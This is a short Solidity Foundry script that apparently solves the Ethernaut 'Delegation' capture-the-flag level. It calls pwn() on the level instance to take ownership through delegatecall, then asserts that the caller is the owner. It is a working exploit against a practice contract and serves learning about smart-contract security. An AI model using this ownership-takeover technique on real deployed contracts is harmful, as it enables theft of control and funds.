// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {EthernautScript} from "src/common/EthernautScript.sol";
import {Delegate} from "./Problem.sol";

contract SolutionScript is EthernautScript {
    function solve(address payable _instanceAddress) internal override {
        vm.startBroadcast();
        Delegate problem = Delegate(_instanceAddress);
        problem.pwn();
        assert(problem.owner() == tx.origin);
        vm.stopBroadcast();
    }

    function getLevelAddress() internal view override returns (address) {
        return 0x9451961b7Aea1Df57bc20CC68D72f662241b5493;
    }
}
